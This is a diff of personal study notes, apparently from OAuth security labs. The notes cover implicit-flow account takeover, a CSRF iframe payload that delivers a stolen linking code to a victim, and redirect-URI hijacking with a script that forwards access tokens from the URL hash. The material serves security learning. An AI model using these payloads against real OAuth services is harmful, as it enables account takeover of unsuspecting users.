@@ -1,5 +1,13 @@
-```
-Oath Implicit POST you can change mail and just authenticate as that user
+
+1. Oath Implicit POST you can change mail and just authenticate as that user:
+	+ From this:
+	
+	![[Pasted image 20260731173735.png|257]]
+	
+	![[Pasted image 20260731173742.png|534]]
+
+	* To this (**RE-USE OTHER USER TOKEN**):   
+	![[Pasted image 20260731173856.png|536]]
 
 
 Browse on https://oath/.well-known/openid-configuration to see config file
@@ -12,7 +20,11 @@ Browse on https://oath/.well-known/openid-configuration to see config file
 No CSRF token protection:
 1. Oauth linking option, automatically logs you in, capture social logging linking, copy URL and drop
 Send to Victim
+
+```js
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
+```
+
 Now if you log out and log in using social media profile you are instantly logged as administrator
 
 2. Hijack Redirect URI
@@ -33,7 +45,6 @@ window.location = '/?'+document.location.hash.substr(1)
 }
 </script>
 
-```
 ##### Capture OAuth link 
 And send it in an iframe to make the victim perform the ouathflow. Then login with social media, it will load the victim user.
 `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
